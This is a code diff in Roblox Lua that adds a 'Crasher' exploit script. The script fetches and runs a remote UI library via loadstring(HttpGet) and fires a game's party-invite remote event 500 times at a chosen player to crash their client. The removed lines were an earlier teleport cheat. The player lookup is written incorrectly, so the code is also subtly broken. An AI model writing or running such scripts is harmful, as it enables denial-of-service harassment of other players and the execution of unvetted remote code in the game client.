@@ -1,9 +1,14 @@
-while true do wait()
-			
-				local UserInputService = game:GetService("UserInputService")
-				local mouseLocation = UserInputService:GetMouseLocation()
-				game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
-					if key == "v" then
-						players.LocalPlayer.Character.HumanoidRootPart.CFrame = mouseLocation.Magnitude
-					end
-				end)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+			local Window = Library.CreateLib("Crasher", "DarkTheme")
+			local Tab = Window:NewTab("Crasher")
+			local Section = Tab:NewSection("Crasher")
+			Section:NewTextBox("Crash", "Crashed the player", function(txt)
+				local args = {
+					[1] = {
+						["player"] = game:GetService("Players").txt
+					}
+				}
+				for i = 1,500 do
+					game:GetService("ReplicatedStorage"):FindFirstChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events").inviteToParty:FireServer(unpack(args))
+				end
+			end)
